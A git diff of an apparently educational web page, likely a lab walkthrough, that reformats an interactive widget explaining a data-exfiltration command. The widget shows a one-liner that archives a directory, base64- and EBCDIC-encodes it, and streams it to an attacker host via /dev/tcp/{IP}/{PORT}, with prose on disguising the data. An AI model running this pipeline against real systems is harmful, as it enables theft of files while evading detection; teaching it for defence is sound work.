@@ -149,6 +149,11 @@ function togglePerspective(container) {
 
 Communication over TCP requires two machines, one victim and one attacker machine, to transfer data. 
 
+
+What is happening here is a pipeline:
+
+`Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer`
+
 <div class="code-block-container">
   <span class="code-lang-tag">Terminal</span>
   <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
@@ -160,22 +165,15 @@ Communication over TCP requires two machines, one victim and one attacker machin
   {% raw %}
   <div class="interactive-command">
     <div style="font-size:0.95em; margin-bottom:8px; color:#888;">Click any part to see a short explanation</div>
-    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;">
-      <code>
-        <span class="cmd-token" onclick="explain('tar')">tar zcf - task4/</span>
-         <span class="cmd-sep">|</span>
-        <span class="cmd-token" onclick="explain('base64')">base64</span>
-         <span class="cmd-sep">|</span>
-        <span class="cmd-token" onclick="explain('dd')">dd conv=ebcdic</span>
-         <span class="cmd-sep">&gt;</span>
-        <span class="cmd-token" onclick="explain('devtcp')">/dev/tcp/{IP}/{PORT}</span>
-      </code>
+    <pre style="background:#0b0c10;color:#f8f8f2;padding:12px;border-radius:6px;overflow:auto;white-space:nowrap;">
+      <code><span class="cmd-token" onclick="explain('tar')">tar zcf - task4/</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('base64')">base64</span><span class="cmd-sep"> | </span><span class="cmd-token" onclick="explain('dd')">dd conv=ebcdic</span><span class="cmd-sep"> &gt; </span><span class="cmd-token" onclick="explain('devtcp')">/dev/tcp/{IP}/{PORT}</span></code>
     </pre>
     <div id="cmd-explain" style="margin-top:8px;padding:10px;border-radius:6px;background:#f6f6f6;color:#111;font-size:0.95em;min-height:34px;">Click a segment for a concise explanation.</div>
   </div>
 
   <style>
-    .cmd-token{cursor:pointer;color:#8be9fd;padding:2px 4px;border-radius:4px}
+    .interactive-command pre{white-space:nowrap;overflow-x:auto}
+    .cmd-token{cursor:pointer;color:#8be9fd;padding:2px 4px;border-radius:4px;display:inline-block}
     .cmd-token:hover{background:rgba(139,233,253,0.08)}
     .cmd-sep{color:#bfbfbf;padding:0 6px}
   </style>
@@ -201,10 +199,6 @@ Communication over TCP requires two machines, one victim and one attacker machin
 This command looks complex, but it is really just a chain of simple tools working together. At a high level, it takes a directory, packages it up, slightly disguises the data, and sends it directly to another machine over the network.
 
 Nothing is written to disk. Everything happens as a live data stream.
-
-What is happening here is a pipeline:
-
-`Directory → Compressed archive → Text encoding → Obfuscated encoding → Network transfer`
 
 Each command receives data, transforms it, and passes it along to the next step.
 
